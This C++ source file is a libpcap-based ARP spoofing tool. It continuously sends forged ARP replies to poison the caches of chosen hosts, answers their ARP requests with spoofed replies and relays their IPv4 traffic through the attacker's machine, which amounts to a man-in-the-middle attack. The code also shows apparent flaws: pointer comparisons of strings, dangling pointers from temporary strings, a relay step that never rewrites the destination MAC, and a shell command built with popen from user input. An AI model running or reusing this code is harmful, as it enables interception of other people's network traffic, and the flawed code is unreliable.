#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <semaphore.h>

struct ipv4_header {
    uint8_t  version_ihl;
    uint8_t  tos;        
    uint16_t total_length; 
    uint16_t identification; 
    uint16_t flags_frag_offset; 
    uint8_t  ttl;         
    uint16_t checksum;   
    uint32_t src_addr;    
    uint32_t dest_addr;   
};

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

pcap_t* pcap;
char my_mac[18];
char my_ip[16];
sem_t semaphore;

typedef struct {
    Mac smac_;
    char* target_ip;
} thread_args_t;


#pragma pack(pop)
void usage() {
	printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: send-arp wlan0 1.1.1.1 2.2.2.2\n");
}

void send_arp(pcap_t* handle, char* sender_ip, char* sender_mac, char* target_ip){
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(sender_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(sender_mac);
	packet.arp_.sip_ = htonl(Ip(sender_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(target_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
}

void reply_arp(pcap_t* handle, const char* sender_mac, const char* dest_mac, char* target_ip){
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac(dest_mac);
	packet.eth_.smac_ = Mac(sender_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(sender_mac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(target_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
}

//infect 
void* auto_send(void* arg) {
	thread_args_t* args = (thread_args_t*)arg;
    while (1) { 
		sem_wait(&semaphore);
        reply_arp(pcap, my_mac, std::string(args->smac_).c_str(), args->target_ip);
        sem_post(&semaphore);
		sleep(5);
    }
    pthread_exit(NULL);
}


int main(int argc, char* argv[]){
	if (argc < 4 || argc %2 ==1) {
		usage();
		return -1;
	}
	
	int NUM_THREADS = (argc -1) / 2;
    sem_init(&semaphore, 0, NUM_THREADS);
	pthread_t threads[NUM_THREADS];
	const char* check_thread[NUM_THREADS] ={0,};
	char command[50];

	snprintf(command, sizeof(command), "ifconfig %s | grep ether | awk '{print $2}'", argv[1]);
    FILE *fp = popen(command, "r");
    if (fp == NULL) {
        perror("popen failed");
        return 1;
    }

    if (fgets(my_mac, sizeof(my_mac), fp) != NULL) {
        my_mac[strcspn(my_mac, "\n")] = 0;
        //printf("MAC Address: %s\n", my_mac);
	}

	snprintf(command, sizeof(command), "ifconfig %s | grep netmask | awk '{print $2}'", argv[1]);
    fp = popen(command, "r");
    if (fp == NULL) {
        perror("popen failed");
        return 1;
    }

    if (fgets(my_ip, sizeof(my_ip), fp) != NULL) {
        my_ip[strcspn(my_ip, "\n")] = 0;
        printf("IP Address: %s\n", my_ip);
	}

	//spcap_open_live(dev, BUFSIZ, 1, 1, errbuf)
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if ( pcap == NULL) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	int fin_thread = 0;
	int i = 0;
	int is_arp=0;
	for(int j = 1; j<=NUM_THREADS;j++){
		send_arp(pcap, my_ip, my_mac, argv[(j*2)]);
	}
	while (true){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));				
			continue;
		}
		// //EthArpPacket packet;
		struct EthHdr *ether = (struct EthHdr *) packet;
		char sender_ip[INET_ADDRSTRLEN];
		if(ether->type_ == htons(EthHdr::Arp)){
			struct ArpHdr *arpheader = (struct ArpHdr *) (packet + sizeof(struct EthHdr));
			
        	inet_ntop(AF_INET, &(arpheader->sip_), sender_ip, INET_ADDRSTRLEN);
			
			if(arpheader->op_ == htons(ArpHdr::Reply)){
				for( int j = 0; j < NUM_THREADS; j++ ){
					if( strcmp(sender_ip, argv[(j+1)*2]) == 0 ){
						printf("pass");
						if(check_thread[j]==0){
							thread_args_t* args = (thread_args_t*)malloc(sizeof(thread_args_t));
							args->smac_ = arpheader->smac_;
							args->target_ip = argv[(j+1)*2+1];
							pthread_create(&threads[j], NULL, auto_send, args);
							check_thread[j]=std::string(arpheader->smac_).c_str();
						}
					}
				}
			}
			else{
				//Request
					//case1 Sender to (Broadcast or Target)
					for(int j =0; j< NUM_THREADS; j++){
						if( std::string(arpheader->sip_).c_str() == argv[(j+1)*2] ) {
							if(std::string(arpheader->tip_).c_str() == argv[(j+1)*2+1] ){
								reply_arp(pcap, my_mac, std::string(arpheader->smac_).c_str(), argv[(j+1)*2+1]);
								continue;
							}
						}
						//case2 (Target to Broadcast or Sender)
						else if ( std::string(arpheader->sip_).c_str() == argv[(j+1)*2+1] ){
							if(std::string(arpheader->tip_).c_str() == (argv[(j+1)*2])){
								reply_arp(pcap, my_mac, check_thread[j], argv[(j+1)*2+1]);
								continue;
							}
						}
					}
			}
		}
		else if(ether->type_ == htons(EthHdr::Ip4)){
			for( int j = 0; j < NUM_THREADS; j++ ){
				if( !(strcmp(std::string(ether->smac_).c_str(), check_thread[j])) ){
					u_char* copy_packet = (u_char*)malloc(header->caplen);
					memcpy(copy_packet, packet, header->caplen);
					
					struct EthHdr* copy_ether = (struct EthHdr*)copy_packet;
            		//memcpy(copy_ether->smac_, static_cast<uint8_t*>(Mac(my_mac)), Mac::SIZE);
					copy_ether->smac_ = Mac(my_mac);
	   				int res = pcap_sendpacket(pcap, copy_packet, header->caplen);
	  				 if (res != 0) {
    					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
					}
					free(copy_packet);

				}
			}
		}


	}
	pcap_close(pcap);	
}